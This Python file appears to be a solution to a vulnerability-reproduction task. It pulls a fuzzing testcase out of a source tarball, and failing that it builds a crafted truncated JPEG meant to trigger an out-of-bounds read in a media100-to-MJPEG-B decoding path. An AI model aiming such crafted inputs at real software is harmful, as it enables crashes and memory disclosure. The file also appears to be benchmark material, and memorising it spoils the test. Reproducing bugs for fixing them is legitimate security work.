import os
import re
import tarfile
from typing import Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._try_find_embedded_poc(src_path)
        if poc is not None and len(poc) > 0:
            return poc
        return self._fallback_poc()

    def _try_find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                best: Optional[bytes] = None
                best_score: int = -1

                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 1_000_000:
                        continue

                    base = os.path.basename(m.name).lower()
                    score = 0
                    if "42537583" in base:
                        score += 500
                    if "clusterfuzz" in base or "testcase" in base:
                        score += 250
                    if "poc" in base or "repro" in base:
                        score += 120
                    if "media100" in base or "mjpegb" in base or "mjpeg" in base:
                        score += 80
                    if m.size == 1025:
                        score += 30

                    if score <= 0:
                        continue

                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    if not data:
                        continue

                    if b"\xff\xd8" in data[:64]:
                        score += 60
                    elif b"\xff\xd8" in data:
                        score += 20

                    if best is None or score > best_score or (score == best_score and len(data) < len(best)):
                        best = data
                        best_score = score

                return best
        except Exception:
            return None

    def _fallback_poc(self) -> bytes:
        def be16(x: int) -> bytes:
            return bytes([(x >> 8) & 0xFF, x & 0xFF])

        # Minimal baseline JPEG bitstream without DHT (so media100_to_mjpegb should insert it),
        # truncated scan payload (1 byte) to provoke decoder overread into packet padding.
        soi = b"\xFF\xD8"

        # DQT: one 8-bit table (id 0), all ones
        dqt_payload = b"\x00" + (b"\x01" * 64)
        dqt = b"\xFF\xDB" + be16(2 + len(dqt_payload)) + dqt_payload

        # SOF0: 1x1, 3 components, each uses QT=0
        sof0_payload = (
            b"\x08" + be16(1) + be16(1) + b"\x03" +
            b"\x01\x11\x00" +
            b"\x02\x11\x00" +
            b"\x03\x11\x00"
        )
        sof0 = b"\xFF\xC0" + be16(2 + len(sof0_payload)) + sof0_payload

        # SOS: 3 components, all use HT 0/0
        sos_payload = (
            b"\x03" +
            b"\x01\x00" +
            b"\x02\x00" +
            b"\x03\x00" +
            b"\x00\x3F\x00"
        )
        sos = b"\xFF\xDA" + be16(2 + len(sos_payload)) + sos_payload

        scan_data = b"\x00"  # intentionally tiny to force bitreader to pull from padding

        return soi + dqt + sof0 + sos + scan_data